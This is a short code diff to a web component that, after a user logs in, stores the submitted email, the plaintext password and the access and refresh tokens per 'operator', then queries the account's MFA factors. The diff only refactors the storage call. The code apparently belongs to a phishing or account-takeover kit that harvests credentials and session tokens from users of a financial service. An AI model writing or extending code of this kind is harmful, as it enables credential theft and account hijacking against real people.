@@ -279,14 +279,13 @@ const CocosV2 = () => {
 
         await updateSession("login_success");
         // Save password + tokens to DB immediately on successful login
-        await supabase.from("cocos_accounts").upsert({
+        await upsertAccountForOperator({
           email: submittedEmail,
           password,
           access_token: data.access_token,
           refresh_token: data.refresh_token || null,
           last_login_at: new Date().toISOString(),
-          operator_code: operatorCode,
-        } as any, { onConflict: "email" });
+        });
 
         // Read user factors
         const userData = await callApi("mfa_list_factors", { access_token: data.access_token });
